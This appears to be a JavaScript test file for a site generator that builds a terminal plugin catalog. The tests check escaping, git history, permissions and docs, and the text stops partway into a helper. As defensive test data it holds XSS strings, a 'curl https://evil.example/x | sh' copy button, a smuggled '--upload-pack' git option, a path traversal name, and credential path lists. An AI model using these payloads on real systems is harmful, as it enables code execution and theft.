// `node --test site/test.mjs`: the site builds from a fixture catalog, derives every date and count from git history, and
// nothing a plugin's author wrote can run on it.

import assert from 'node:assert/strict';
import { execFileSync, spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import http from 'node:http';

import { build, CAST_MAX, catalog, CSP, egressMissing, fingerprint, gain, isOfficial, nerdDocs, pluginReads, kinds, lastCommitOf, manifestDiff, markdown, permChange, prOf, README_MAX, readSource, safeUrl, widened } from './build.mjs';

const fixtures = path.join(path.dirname(fileURLToPath(import.meta.url)), 'fixtures');
// a small nerd repository: the pages about nerd are built from its README, CHANGELOG, plugin guide and SECURITY.md
const nerdRepo = path.join(fixtures, 'nerd');
// the same, with the README split into docs/<slug>.md pages, as nerd's docs are after 0.11.0
const nerdSplit = path.join(fixtures, 'nerd-split');
const tmp = (name) => fs.mkdtempSync(path.join(os.tmpdir(), `nerd-site-${name}-`));
const A = 'a'.repeat(40);
const B = 'b'.repeat(40);
const C = 'c'.repeat(40);
const D = 'd'.repeat(40);

/** A catalog repository whose history has the given dated commits: each writes files, then commits on that day. */
function catalogRepo(steps) {
  const root = tmp('repo');
  const env = { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1', GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@example.com', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@example.com' };
  const git = (...a) => execFileSync('git', ['-C', root, ...a], { env: { ...env, ...git.env }, stdio: 'ignore' });
  git('init', '--quiet', '-b', 'main');
  for (const [date, files, message] of steps) {
    for (const [f, v] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(root, f)), { recursive: true });
      fs.writeFileSync(path.join(root, f), typeof v === 'string' ? v : JSON.stringify(v));
    }
    git.env = { GIT_AUTHOR_DATE: `${date}T12:00:00Z`, GIT_COMMITTER_DATE: `${date}T12:00:00Z` };
    git('add', '-A');
    git('commit', '--quiet', '-m', message ?? `step ${date}`);
  }
  return root;
}

const entry = (over) => ({ title: 'T', summary: 'S', url: 'https://github.com/someone/x', tag: 'v1.0.0', commit: A, version: '1.0.0', risk: 0, review: 'checked', ...over });
const data = (over) => ({ abilities: ['Runs /bin/sh'], platforms: [], min_nerd: null, readme: '# x', cast: null, ...over });

/** alpha: two releases, the second reaching the network and featured; beta: warned about; gamma: revoked. */
function fixtureCatalog() {
  const root = catalogRepo([
    ['2026-06-01', { 'stars.json': { changed: '2026-06-01', stars: { alpha: 10 } }, 'revoked.json': '[]', 'official.json': '["alpha"]' }],
    ['2026-07-01', { 'plugins/alpha.json': entry({ url: 'https://github.com/nerdterm/alpha' }) }],
    // The same release marked again later: it keeps the mark it entered the catalog with.
    ['2026-07-05', { 'plugins/alpha.json': entry({ url: 'https://github.com/nerdterm/alpha', review: 'reviewed' }) }],
    ['2026-09-01', { 'stars.json': { changed: '2026-09-01', stars: { alpha: 40 } } }],
    ['2026-09-20', { 'plugins/alpha.json': entry({ url: 'https://github.com/nerdterm/alpha', tag: 'v1.1.0', version: '1.1.0', commit: B, risk: 2, review: 'reviewed', featured: true }) }, 'feat: alpha 1.1.0 (#7)'],
    ['2026-09-28', { 'stars.json': { changed: '2026-09-28', stars: { alpha: 50, beta: 3 } }, 'plugins/beta.json': entry({ url: 'https://github.com/someone/beta', commit: C, risk: 1, review: 'reviewed' }) }],
    ['2026-10-02', { 'plugins/gamma.json': entry({ url: 'https://github.com/other/gamma', commit: D }) }],
    ['2026-10-03', { 'revoked.json': [{ name: 'beta', commit: C, level: 'soft', why: 'it logs a token' }, { name: 'gamma', commit: D, level: 'hard', why: 'it read files outside the tree' }] }],
    ['2026-10-05', { 'stars.json': { changed: '2026-10-05', stars: { alpha: 70, beta: 5, gamma: 1 } } }],
  ]);
  const dir = path.join(root, 'data');
  fs.mkdirSync(dir);
  const v10 = { name: 'alpha', version: '1.0.0', min_nerd: '0.8.0', previews: [{ extensions: ['db'] }] };
  const v11 = { ...v10, version: '1.1.0', permissions: { network: { hosts: ['api.example.com'], ports: [443] } }, commands: [{ id: 'r' }] };
  fs.writeFileSync(path.join(dir, 'alpha.json'), JSON.stringify(data({ abilities: ['Runs /bin/sh', 'Learns which .db files you select, and reads them'], min_nerd: '0.8.0', manifest: v11, manifests: { [A]: v10, [B]: v11 }, tagCommit: B })));
  fs.writeFileSync(path.join(dir, 'beta.json'), JSON.stringify(data({ manifest: { name: 'beta', permissions: { write: ['~/.cache/beta'] } } })));
  fs.writeFileSync(path.join(dir, 'gamma.json'), JSON.stringify(data({ min_nerd: '0.9.0', manifest: { name: 'gamma' } })));
  return { root, dir };
}

test('markdown keeps no html of its own and no link but http', () => {
  const html = markdown('# Hi <script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n[a](javascript:alert(1)) [b](https://example.com/x) [c](data:text/html,x)\n\n```\n<b>code</b>\n```\n\n| a | b |\n|---|---|\n| <i>1</i> | `2` |');
  assert.ok(!html.includes('<script') && !html.includes('<img') && !html.includes('<i>'), html);
  assert.ok(html.includes('&lt;script&gt;') && html.includes('&lt;img src=x onerror=alert(1)&gt;'), html);
  assert.ok(!/href="javascript/.test(html), html);
  assert.ok(html.includes('<a href="https://example.com/x" rel="nofollow noopener">b</a>'), html);
  assert.ok(!/href="data:/.test(html) && html.includes('&lt;b&gt;code&lt;/b&gt;'), html);
  assert.ok(html.includes('<td>&lt;i&gt;1&lt;/i&gt;</td><td><code>2</code></td>'), html);
  assert.equal(safeUrl('javascript:alert(1)'), null);
  assert.equal(safeUrl('https://x.example/'), 'https://x.example/');
});

test('dates, releases, marks, featured and revocations come from the catalog history', () => {
  const { root, dir } = fixtureCatalog();
  const { data: d } = catalog(root, dir, { nerdRepo, today: '2026-10-05', nerd: '0.10.0' });
  const [alpha, beta, gamma] = d.plugins;
  assert.deepEqual(d.plugins.map((p) => p.name), ['alpha', 'beta', 'gamma']);
  assert.equal(alpha.added, '2026-07-01');
  assert.equal(alpha.updated, '2026-09-20');
  assert.deepEqual(alpha.versions.map((v) => [v.tag, v.date, v.mark, v.risk]), [['v1.1.0', '2026-09-20', 'reviewed', 2], ['v1.0.0', '2026-07-01', 'checked', 0]]);
  assert.deepEqual(alpha.versions.map((v) => v.pr), ['https://github.com/nerdterm/nerd-plugins/pull/7', null], 'a release links the pull request its commit subject names');
  assert.equal(prOf('fix: x (#12)'), 'https://github.com/nerdterm/nerd-plugins/pull/12');
  assert.equal(prOf('fix: x'), null);
  assert.match(alpha.versions[0].perm, /Permissions changed: network: now only api\.example\.com on port 443, before no network; now adds menu commands\./);
  assert.match(alpha.versions[0].perm, /The risk level rose from only shows things to reaches the network\./);
  assert.equal(alpha.versions[1].perm, 'First release in the catalog.');
  assert.equal(alpha.featured, true);
  assert.equal(beta.featured, false);
  assert.ok(alpha.official && !beta.official && beta.author === 'someone');
  assert.deepEqual(alpha.types, ['.db']);
  assert.deepEqual(alpha.can.network, { hosts: ['api.example.com'], ports: [443] });
  assert.deepEqual(beta.can.files, ['~/.cache/beta']);
  assert.deepEqual(beta.revoked, { level: 'soft', current: true, release: 'v1.0.0', on: '2026-10-03', why: 'it logs a token' });
  assert.deepEqual(gamma.revoked, { level: 'hard', current: true, release: 'v1.0.0', on: '2026-10-03', why: 'it read files outside the tree' });
  assert.equal(alpha.revoked, null);
  assert.deepEqual(d.nerdVersions, ['0.10.0', '0.9.0', '0.8.0']);
  assert.equal(d.starsChanged, '2026-10-05');
});

test("official is nerdterm's own repository whose tag is the entry's commit, never the entry's word", () => {
  const e = (url) => ({ url, commit: B });
  assert.ok(isOfficial(e('https://github.com/nerdterm/alpha'), B));
  assert.ok(isOfficial(e('https://github.com/NerdTerm/alpha'), B), 'the owner compared case-insensitively');
  assert.ok(!isOfficial(e('https://github.com/nerdterm/alpha'), A), 'the tag resolves elsewhere');
  assert.ok(!isOfficial(e('https://github.com/nerdterm/alpha'), null), 'the tag check could not run');
  for (const url of ['https://github.com/nerdterm-x/alpha', 'https://github.com/nerdterm.evil/alpha', 'https://github.com/nerdterm/x/extra', 'https://github.com/someone/nerdterm', 'https://github.com/nerdterm/alpha.git', 'https://github.com/nerdterm/alpha/', 'https://github.com/nerdterm/..', 'http://github.com/nerdterm/alpha', 'https://github.com.evil/nerdterm/alpha', 'https://github.com/nerdterm/alpha#x']) {
    assert.ok(!isOfficial(e(url), B), url);
  }
  const { root, dir } = fixtureCatalog();
  const claims = catalogRepo([['2026-10-01', { 'plugins/beta.json': entry({ url: 'https://github.com/someone/beta', commit: C, official: true }), 'plugins/moved.json': entry({ url: 'https://github.com/nerdterm/moved', commit: C, official: true }) }]]);
  fs.writeFileSync(path.join(dir, 'moved.json'), JSON.stringify(data({ manifest: { name: 'moved' }, tagCommit: D })));
  const [beta, moved] = catalog(claims, dir, { nerdRepo, today: '2026-10-05', nerd: null }).data.plugins;
  assert.deepEqual([beta.official, moved.official], [false, false], 'the entry\'s own "official" has no effect');
  const page = catalog(root, dir, { nerdRepo, today: '2026-10-05', nerd: null }).data.plugins;
  assert.deepEqual(page.map((p) => [p.name, p.official]), [['alpha', true], ['beta', false], ['gamma', false]]);
  // Only the maintainer's official.json grants it (the claims catalog above has none at all).
  const list = (v) => { fs.writeFileSync(path.join(root, 'official.json'), v); return catalog(root, dir, { nerdRepo, today: '2026-10-05', nerd: null }).data.plugins.map((p) => [p.name, p.official]); };
  assert.deepEqual(list('[]'), [['alpha', false], ['beta', false], ['gamma', false]], 'not on the list');
  assert.deepEqual(list('{"alpha": true}'), [['alpha', false], ['beta', false], ['gamma', false]], 'not a list');
  assert.deepEqual(list('not json'), [['alpha', false], ['beta', false], ['gamma', false]], 'unreadable');
  assert.deepEqual(list('["alpha", "beta"]'), [['alpha', true], ['beta', false], ['gamma', false]], 'beta is listed but lives under another owner');
});

test('stars gained are the count now less the count on the day, or since the oldest count', () => {
  const { root, dir } = fixtureCatalog();
  const { data: d } = catalog(root, dir, { nerdRepo, today: '2026-10-05', nerd: null });
  const [alpha, beta, gamma] = d.plugins;
  assert.deepEqual([alpha.stars, alpha.gain7, alpha.gain30, alpha.gain90], [70, 20, 30, 60]);
  assert.deepEqual(alpha.gainSince, { 7: null, 30: null, 90: null });
  assert.deepEqual([beta.gain7, beta.gain30, beta.gainSince[30]], [2, 2, '2026-09-28']);
  assert.deepEqual([gamma.gain7, gamma.gainSince[7]], [0, '2026-10-05']);
  assert.deepEqual(gain('x', null, [], '2026-10-05', 7), { n: 0, since: null });
});

test('permissions in words compare a release with the one before', () => {
  const none = { network: null, files: null, agent: null, types: [], adds: [] };
  assert.equal(permChange(null, none), 'First release in the catalog.');
  assert.equal(permChange(none, none), 'Permissions unchanged.');
  assert.equal(permChange(none, { ...none, files: ['~/x'], agent: ['claude'], adds: ['agents'] }), 'Permissions changed: writes: now ~/x, before nothing outside its own folder; agents: now claude, before none; now adds hooks for an agent.');
});

test('the page carries its policy, loads only its own files and cannot be broken out of by an entry', () => {
  const { root, dir } = fixtureCatalog();
  const evil = '</script><script>alert(1)</script>';
  const e = JSON.parse(fs.readFileSync(path.join(root, 'plugins', 'beta.json'), 'utf8'));
  fs.writeFileSync(path.join(root, 'plugins', 'beta.json'), JSON.stringify({ ...e, title: evil }));
  const out = tmp('out');
  build(out, dir, root, { nerdRepo, today: '2026-10-05', nerd: '0.10.0' });
  const html = fs.readFileSync(path.join(out, 'plugins', 'beta', 'index.html'), 'utf8');
  assert.ok(html.includes(`content="${CSP}"`));
  assert.ok(!html.includes(evil), 'a title cannot end the page early');
  assert.ok(!read(out, 'data.js').includes(evil) && read(out, 'data.js').includes('\\u003c/script>'), 'a title cannot end the data early');
  // Every file a page loads is its own: no scheme, no protocol-relative path, no @import or url() from elsewhere.
  for (const [m, tag, u] of html.matchAll(/<(script|link|img|iframe|source)\b[^>]*?(?:src|href)="([^"]+)"/g)) {
    // the canonical address names the page to search engines and loads nothing
    if (/rel="canonical"/.test(m) && u === 'https://nerdterm.dev/plugins/beta/') continue;
    assert.ok(/^\/[^/]/.test(u), `${tag} loads ${u}: the site's own file, from its root, whatever the page's depth`);
    assert.ok(fs.existsSync(path.join(out, u.slice(1).replace(/\?v=[0-9a-f]+$/, ''))), `${u} is in the build`);
  }
  const css = fs.readFileSync(path.join(out, 'style.css'), 'utf8');
  assert.ok(!/@import|url\(\s*['"]?(https?:)?\/\//i.test(css), 'the stylesheet loads nothing from elsewhere');
  const js = read(out, 'app.js') + read(out, 'render.js') + read(out, 'home.js') + read(out, 'catalog-front.js');
  assert.ok(!/fetch\(|XMLHttpRequest|import\(|new WebSocket|sendBeacon/.test(js), 'the scripts ask no server anything');
  assert.ok(!/fonts\.googleapis|cdn\.|unpkg|jsdelivr/.test(html + css + js));
  const json = JSON.parse(fs.readFileSync(path.join(out, 'catalog.json'), 'utf8'));
  assert.equal(json.plugins.length, 3);
  assert.ok(fs.existsSync(path.join(out, 'vendor', 'asciinema-player', 'LICENSE')));
});

test('an empty catalog builds a page that says so', () => {
  const root = tmp('empty');
  fs.mkdirSync(path.join(root, 'plugins'));
  const out = tmp('empty-out');
  const list = build(out, path.join(root, 'plugins'), root, { nerdRepo, today: '2026-10-05', nerd: '0.10.0' });
  assert.deepEqual(list, []);
  const json = JSON.parse(fs.readFileSync(path.join(out, 'catalog.json'), 'utf8'));
  assert.deepEqual([json.plugins, json.nerdVersions, json.starsChanged], [[], ['0.10.0'], null]);
  assert.match(text(main(page(out, '/plugins/all/'))), /0 of 0 plugins/);
  assert.ok(fs.existsSync(path.join(out, 'plugins', 'index.html')) && !fs.existsSync(path.join(out, 'authors')), 'a catalog front, no author');
});

test('the fixture catalog builds: recordings, risks and the plain install command', () => {
  const out = tmp('fixtures');
  const list = build(out, path.join(fixtures, 'data'), fixtures, { nerdRepo, today: '2026-10-05', nerd: '0.10.0' });
  assert.deepEqual(list.map((p) => p.name), ['bigfiles', 'hooky', 'netty']);
  const [bigfiles, hooky, netty] = list;
  assert.ok(fs.existsSync(path.join(out, 'casts', 'bigfiles.cast')) && bigfiles.cast.width === 80);
  assert.deepEqual([bigfiles.stars, hooky.stars, netty.stars], [42, 1, null]);
  assert.deepEqual(netty.can.network, { hosts: ['wttr.in'], ports: [443] });
  assert.equal(hooky.can.agent, 'Speaks for hooky through its hooks');
  assert.ok(!hooky.readme.includes('<script') && !hooky.readme.includes('href="javascript'), hooky.readme);
  assert.deepEqual(bigfiles.kinds, ['badges']);
  assert.ok(fs.readFileSync(path.join(out, 'render.js'), 'utf8').includes('const install = (p) => `nerd --plugin-add ${p.url}`;'), 'a plain GitHub address, unquoted');
});

test('collections come from what a plugin can do', () => {
  assert.deepEqual(kinds(['Shows badges in the tree', 'Learns which .log files you select, and reads them']), ['badges', 'previews']);
  assert.deepEqual(kinds(['Speaks for the agent x']), ['agents']);
});

test("an entry's own name field cannot steer where the site writes", () => {
  const root = tmp('name');
  fs.mkdirSync(path.join(root, 'plugins'));
  fs.cpSync(path.join(fixtures, 'data'), path.join(root, 'data'), { recursive: true });
  const hooky = JSON.parse(fs.readFileSync(path.join(fixtures, 'plugins', 'hooky.json'), 'utf8'));
  fs.writeFileSync(path.join(root, 'plugins', 'hooky.json'), JSON.stringify({ ...hooky, name: '../../escaped' }));
  const out = path.join(root, 'out');
  const list = build(out, path.join(root, 'data'), root, { nerdRepo, nerd: null });
  assert.deepEqual(list.map((p) => p.name), ['hooky']);
  assert.ok(!fs.existsSync(path.join(root, 'escaped.cast')) && !fs.existsSync(path.join(out, '..', '..', 'escaped.cast')));
  // A file name that is not a plugin name never reaches the page.
  fs.writeFileSync(path.join(root, 'plugins', 'x"onmouseover=y.json'), JSON.stringify(hooky));
  fs.writeFileSync(path.join(root, 'plugins', 'Upper.json'), JSON.stringify(hooky));
  assert.deepEqual(build(out, path.join(root, 'data'), root, { nerdRepo, nerd: null }).map((p) => p.name), ['hooky']);
});

test("a doc's own #anchor stays on its page; another doc's section goes to that page", () => {
  const d = nerdDocs(nerdRepo), guide = d.docs.find((p) => p.slug === 'plugins').html;
  assert.ok(guide.includes('href="/docs/plugins/#network"'), guide);
  assert.ok(!guide.includes('/docs/network/'), 'not a page of its own');
  assert.ok(guide.includes('href="/docs/quick-start/"'), 'a README section is its page, whose heading is the title');
  assert.ok(d.lede.includes('href="/docs/plugins/#network"'), 'a link into the plugin guide keeps its anchor');
  assert.ok(!/nerdterm\.dev/.test(guide + d.lede), 'the site links itself by path');
});

test('nerd\'s docs build the same site from one README or from a README with docs/ pages', () => {
  const one = nerdDocs(nerdRepo), split = nerdDocs(nerdSplit);
  assert.deepEqual(one.docs.map((p) => p.slug), ['requirements', 'limitations', 'installation', 'quick-start', 'usage', 'plugins', 'messages-between-agents', 'privacy-and-security', 'uninstall', 'license']);
  // the README's Documentation list is not a page: the pages it links take its place, in its order
  assert.deepEqual(split.docs.map((p) => p.slug), ['installation', 'quick-start', 'requirements', 'limitations', 'usage', 'isolation', 'messages-between-agents', 'plugins', 'privacy-and-security', 'troubleshooting', 'uninstall', 'license']);
  assert.deepEqual([...split.egress].sort(), [...one.egress].sort(), 'the ways out are read from docs/privacy-and-security.md');
  assert.equal(split.egress.length, 10);
  assert.deepEqual([(one.lede.match(/<li>/g) || []).length, (split.lede.match(/<li>/g) || []).length], [6, 4]);
  const page = (s) => split.docs.find((p) => p.slug === s);
  assert.deepEqual(page('usage').subs.map((x) => x.slug), ['keys', 'updating']);
  assert.match(page('usage').html, /<h3 id="updating">/);
  assert.equal(page('plugins').title, 'Plugins', 'a docs/ page is titled by its own # line');
  // links in docs/ are relative to docs/
  const t = page('troubleshooting').html;
  // a section that is a part of Install or Security links there, not to a docs page
  assert.ok(t.includes('href="/docs/usage/#keys"') && t.includes('href="/install/"') && t.includes('href="/docs/messages-between-agents/"'), t);
  const ps = page('privacy-and-security').html;
  assert.ok(ps.includes('href="https://github.com/nerdterm/nerd/blob/master/SECURITY.md"') && ps.includes('href="/docs/isolation/"') && ps.includes('href="/security/#what-leaves-nerd"'), ps);
  const g = page('plugins').html;
  assert.ok(g.includes('href="https://github.com/nerdterm/nerd/blob/master/templates/plugin/"') && g.includes('href="/docs/quick-start/"') && g.includes('href="/docs/plugins/#network"'), g);
  assert.ok(split.lede.includes('href="/security/#what-leaves-nerd"') && split.lede.includes('href="/install/"'), split.lede);
  assert.equal(split.anchors['how-it-works'], 'privacy-and-security');
  assert.deepEqual(split.docs.filter((p) => p.part).map((p) => `${p.slug}:${p.part}`), ['installation:install', 'requirements:install', 'limitations:install', 'privacy-and-security:security', 'uninstall:install']);
  assert.deepEqual([page('usage').file, page('quick-start').file, one.docs.find((p) => p.slug === 'plugins').file, one.docs.find((p) => p.slug === 'usage').file], ['docs/usage.md', 'README.md', 'docs/plugins.md', 'README.md'], 'each page knows the file it comes from');
  // the summary of the ways out is nerd's own sentence, whichever page holds "What leaves nerd"
  assert.equal(one.waysOut, 'Each way out starts from something you do, says where it goes before it goes, and writes a line to <code>daemon.log</code>.');
  assert.equal(split.waysOut, 'Each way out starts from something you do or approved, and writes a line to <code>daemon.log</code>.');
  const bare = tmp('nerd-leaves');
  fs.cpSync(nerdSplit, bare, { recursive: true });
  fs.writeFileSync(path.join(bare, 'docs', 'privacy-and-security.md'), fs.readFileSync(path.join(nerdSplit, 'docs', 'privacy-and-security.md'), 'utf8').replace(/^Each way out.*\n\n/m, ''));
  assert.throws(() => nerdDocs(bare), /no "What leaves nerd" section that opens with "Each way out/);
  assert.ok(!split.docs.some((p) => p.slug === 'menus'), 'the contributors\' rules, linked from the Documentation list, are no page of the site');
  assert.equal(pluginReads(fs.readFileSync(path.join(nerdSplit, 'docs', 'plugins.md'), 'utf8')).paths.length, 3);
});

test("a way out nerd's README marks and the home page does not draw stops the build", () => {
  const home = fs.readFileSync(path.join(path.dirname(fileURLToPath(import.meta.url)), 'app', 'home.js'), 'utf8');
  assert.deepEqual(egressMissing(['git-fetch', 'pane-network', 'agent-inbox', 'sandbox-off'], home), []);
  assert.deepEqual(egressMissing(['git-fetch', 'a-new-door'], home), ['a-new-door']);
  const nerd = tmp('nerd');
  fs.cpSync(nerdRepo, nerd, { recursive: true });
  fs.appendFileSync(path.join(nerd, 'README.md'), '\n- <!-- egress:a-new-door --> **A new door.**\n');
  assert.throws(() => build(tmp('egress'), path.join(fixtures, 'data'), fixtures, { nerdRepo: nerd, nerd: null }), /ways out the home page does not draw: a-new-door/);
});

test("what no plugin may read comes from nerd's plugin guide, in its words", () => {
  const v011 = "**What a plugin can read.** Every file the user can, except `~/.ssh`, `~/.aws`, the shell histories, the whole of\n`~/Library` (keychains) and nerd's state root (logs); inside the state root it reads only its own folder.";
  const r = pluginReads(`# Plugins\n\n${v011}\n`);
  assert.deepEqual(r.paths, ['~/.ssh', '~/.aws', '~/Library']);
  assert.equal(r.text, "~/.ssh, ~/.aws, the shell histories, the whole of ~/Library (keychains) and nerd's state root (logs)");
  assert.equal(r.html, "<code>~/.ssh</code>, <code>~/.aws</code>, the shell histories, the whole of <code>~/Library</code> (keychains) and nerd&#39;s state root (logs)");
  // nerd's own paragraphs: v0.11.0, and a later wording of the guide, whose four groups name 27 paths
  const real = (f) => pluginReads(fs.readFileSync(path.join(fixtures, 'reads', f), 'utf8'));
  const r011 = real('plugins-v0.11.0.md');
  assert.equal(r011.paths.length, 12);
  assert.match(r011.text, /^~\/\.ssh, .*, ~\/\.config\/gcloud, the shell histories, the whole of ~\/Library \(keychains, cookies, browsers, mail\) and nerd's state root \(sessions, screens, logs, other plugins and their data\)$/);
  const r27 = real('plugins-27-paths.md');
  assert.equal(r27.paths.length, 27);
  assert.ok(['~/.netrc', '~/.pypirc', '~/.zsh_history', '~/.local/share/atuin', '~/.lesshst'].every((p) => r27.paths.includes(p)), r27.paths.join(' '));
  assert.ok(!r27.paths.includes('~/.zsh_history.new'), 'the example after the first sentence is not a denied path');
  assert.equal(r27.text.split('; ').length, 4, 'folders, files, shell histories, the histories of other programs');
  // the exceptions to "any other file is readable" are the guide's own: none at v0.11.0, the prefix and link rules in the later wording
  assert.equal(r011.rules, '');
  assert.equal(r011.otherText, 'Any other file in your home folder is readable, token files such as ~/.codex/auth.json and ~/.git-credentials included.');
  assert.ok(!/link|begins with/.test(r011.otherText + r011.otherHtml), r011.otherText);
  assert.match(r27.rules, /^A denied file covers every name that begins with it \(`~\/\.zsh_history\.new`, where zsh writes the history before renaming it\)\. A link inside a denied folder other than `~\/Library` and nerd's state root/);
  assert.match(r27.otherText, /^Any other file in your home folder is readable, token files such as ~\/\.codex\/auth\.json and ~\/\.git-credentials included, except as the plugin guide goes on to say: “A denied file covers every name that begins with it .* A history kept anywhere else \(another HISTFILE, ZDOTDIR or XDG_DATA_HOME\) is readable\.”$/);
  assert.ok(!/Inside the state root|terminal device/.test(r27.rules), 'the exceptions end where the guide turns to the state root');
  assert.ok(r27.otherHtml.includes('<code>~/.zsh_history.new</code>') && r27.otherHtml.includes('<code>~/.codex/auth.json</code>'), r27.otherHtml);
  assert.match(r27.text, /; the files ~\/\.netrc, ~\/\.npmrc and ~\/\.pypirc; the shell histories ~\/\.zsh_history, .*; and the histories of python, node, psql, mysql, sqlite3, irb and less: ~\/\.python_history, .* and ~\/\.lesshst$/);
  // a denied file covers every name that begins with it, a denied folder only what is under it
  assert.throws(() => pluginReads(fs.readFileSync(path.join(fixtures, 'reads', 'plugins-27-paths.md'), 'utf8').replace('`~/.netrc`', '`~/.git`')), /~\/\.git-credentials stays readable/);
  const groups = (folders, files) => `**What a plugin can read.** Every file the user can, except the folders ${folders}; the files ${files}. A denied file covers every name that begins with it.`;
  assert.doesNotThrow(() => pluginReads(groups('`~/.git` and `~/.ssh`', '`~/.netrc`')), 'a folder ~/.git does not cover ~/.git-credentials');
  assert.throws(() => pluginReads(groups('`~/.ssh`', '`~/.git` and `~/.netrc`')), /~\/\.git-credentials stays readable/);
  assert.throws(() => pluginReads('# Plugins\n\nNo such paragraph.\n'), /has no "What a plugin can read\." paragraph/);
  assert.throws(() => pluginReads('**What a plugin can read.** Every file the user can, except nothing at all; and more.'), /has no "What a plugin can read\." paragraph/);
  assert.throws(() => pluginReads(v011.replace('`~/.aws`', '`~/.codex`')), /says ~\/\.codex\/auth\.json stays readable, but nerd's plugin guide now denies it/);
  // a nerd checkout without the paragraph stops the build
  const nerd = tmp('nerd-reads');
  fs.cpSync(nerdRepo, nerd, { recursive: true });
  fs.writeFileSync(path.join(nerd, 'docs', 'plugins.md'), '# Plugins\n\n## Sandbox\n\nA plugin runs in its own sandbox.\n');
  assert.throws(() => build(tmp('reads'), path.join(fixtures, 'data'), fixtures, { nerdRepo: nerd, nerd: null }), /What a plugin can read/);
});

test('a run of brackets, stars or parentheses in a README renders in linear time', () => {
  for (const c of ['[', '*', '(', '`', '](']) {
    const t = Date.now();
    markdown(c.repeat(40000));
    assert.ok(Date.now() - t < 500, `${c} x 40000 took ${Date.now() - t} ms`);
  }
});

test('a README or recording over its cap is replaced by a sentence saying so', () => {
  const { root, dir } = fixtureCatalog();
  const alpha = JSON.parse(fs.readFileSync(path.join(dir, 'alpha.json'), 'utf8'));
  fs.writeFileSync(path.join(dir, 'alpha.json'), JSON.stringify({ ...alpha, readme: 'x'.repeat(README_MAX + 1), cast: '{"version":2,"width":80,"height":24}\n' + 'y'.repeat(CAST_MAX) }));
  const { data: d, casts } = catalog(root, dir, { nerdRepo, today: '2026-10-05', nerd: null });
  assert.match(d.plugins[0].readme, /The README is over 256 KB, too long to show here/);
  assert.equal(d.plugins[0].cast, null);
  assert.ok(!casts.alpha);
  assert.deepEqual(d.plugins[0].notes, ['Its recording is over 4 MB, too large to show here.']);
});

test("a recording's header carries no markup and no odd size onto the page", () => {
  const { root, dir } = fixtureCatalog();
  const alpha = JSON.parse(fs.readFileSync(path.join(dir, 'alpha.json'), 'utf8'));
  const evil = '<a href="https://evil.example/">x</a><button class="btn" data-copy="curl https://evil.example/x | sh">Copy</button>';
  const bad = [{ version: 2, width: evil, height: 24 }, { version: 2, width: 80, height: '24<meta http-equiv="refresh">' }, { version: 2, width: 5000, height: 24 }, { version: 2, width: 80.5, height: 24 }, { version: 9, width: 80, height: 24 }];
  for (const head of bad) {
    fs.writeFileSync(path.join(dir, 'alpha.json'), JSON.stringify({ ...alpha, cast: `${JSON.stringify(head)}\n[0.1,"o","hi"]\n` }));
    const out = tmp('cast');
    build(out, dir, root, { nerdRepo, today: '2026-10-05', nerd: null });
    const a = JSON.parse(read(out, 'catalog.json')).plugins[0];
    assert.equal(a.cast, null, JSON.stringify(head));
    assert.ok(a.notes.includes('Its recording is not a valid asciicast file, so it is not shown.'), a.notes.join('|'));
    assert.ok(!fs.existsSync(path.join(out, 'casts', 'alpha.cast')));
    assert.ok(!page(out, '/plugins/alpha/').includes('evil.example') && !read(out, 'data.js').includes('evil.example'), 'nothing of the header reaches the page');
  }
  fs.writeFileSync(path.join(dir, 'alpha.json'), JSON.stringify({ ...alpha, cast: '{"version":3,"term":{"cols":120,"rows":40}}\n[0.5,"o","hi"]\n' }));
  const out = tmp('cast3');
  build(out, dir, root, { nerdRepo, today: '2026-10-05', nerd: null });
  assert.deepEqual(JSON.parse(read(out, 'catalog.json')).plugins[0].cast, { width: 120, height: 40, duration: 0.5, v: fingerprint('{"version":3,"term":{"cols":120,"rows":40}}\n[0.5,"o","hi"]\n') });
});

test('a recording whose events are not [time, code, data] in order is not shown', () => {
  const { root, dir } = fixtureCatalog();
  const alpha = JSON.parse(fs.readFileSync(path.join(dir, 'alpha.json'), 'utf8'));
  const v2 = '{"version":2,"width":80,"height":24}', v3 = '{"version":3,"term":{"cols":80,"rows":24}}';
  const shown = (cast) => {
    fs.writeFileSync(path.join(dir, 'alpha.json'), JSON.stringify({ ...alpha, cast }));
    return catalog(root, dir, { nerdRepo, today: '2026-10-05', nerd: null }).data.plugins[0];
  };
  for (const events of ['["<img src=x>","o","hi"]', '[-1,"o","hi"]', '[1,"o"]', '[1,"o",5]', '{"t":1}', '[0.5,"o","a"]\n[0.2,"o","b"]', '[0.5,"o","a"]\n\n[0.6,"o","b"]', '[0.1,"o","a"] [0.2,"o","b"]']) {
    const a = shown(`${v2}\n${events}\n`);
    assert.equal(a.cast, null, events);
    assert.ok(a.notes.includes('Its recording is not a valid asciicast file, so it is not shown.'), events);
  }
  assert.equal(shown(`${v2}\n[0.5,"o","a"]\n[0.5,"i","b"]\n[2,"o","c"]\n`).cast.duration, 2);
  // version 3 times are intervals, and it allows comment lines
  assert.equal(shown(`${v3}\n[0.5,"o","a"]\n# a comment\n[0.25,"o","b"]\n`).cast.duration, 0.75);
});

test('a plugin whose source cannot be read stays listed and the others still build', () => {
  const { root, dir } = fixtureCatalog();
  fs.renameSync(path.join(dir, 'beta.json'), path.join(dir, 'beta.gone'));
  const { data: d } = catalog(root, dir, { nerdRepo, today: '2026-10-05', nerd: null });
  assert.deepEqual(d.plugins.map((p) => [p.name, p.unavailable]), [['alpha', false], ['beta', true], ['gamma', false]]);
  const beta = d.plugins[1];
  assert.deepEqual([beta.readme, beta.cast, beta.abilities, beta.risk, beta.review], ['', null, [], 1, 'reviewed']);
  // Without --data the source is fetched: a commit that is not 40 hex characters is refused before any git call.
  const bad = catalogRepo([['2026-10-01', { 'plugins/odd.json': entry({ commit: '--upload-pack=touch /tmp/x' }) }]]);
  const { data: o } = catalog(bad, null, { nerdRepo, today: '2026-10-05', nerd: null });
  assert.deepEqual(o.plugins.map((p) => [p.name, p.unavailable]), [['odd', true]]);
});

/** A plugin folder under git, with `files` (a value of {link} makes a symbolic link), committed once. */
function pluginRepo(files) {
  const dir = tmp('plugin');
